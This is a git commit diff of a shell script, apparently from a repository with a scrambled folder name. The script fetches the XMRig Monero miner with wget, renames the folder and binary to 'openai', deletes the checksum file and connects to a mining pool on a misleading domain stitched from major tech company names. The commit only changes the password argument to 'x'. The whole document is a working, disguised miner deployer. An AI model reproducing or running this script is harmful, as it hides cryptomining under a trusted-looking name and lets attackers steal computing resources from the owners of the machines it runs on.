17ba4fe998366a1dd55bb3c44a686266b3dee645
caippx <37325838+caippx@users.noreply.github.com>
2024-02-06 20:08:03 +0800

    Update wk2024.sh

--- drfytgybhunjoimkol/wk2024.sh
+++ drfytgybhunjoimkol/wk2024.sh
@@ -1,11 +1,10 @@
 #!/bin/bash
 
 U=$1
-P=$2
 wget -O 1.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz 
 tar -zxvf 1.tar.gz
 mv xmrig-6.21.0 openai
 mv openai/xmrig openai/openai
 rm -rf 1.tar.gz
 cd openai && rm -rf SHA256SUMS
-./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p $P
+./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
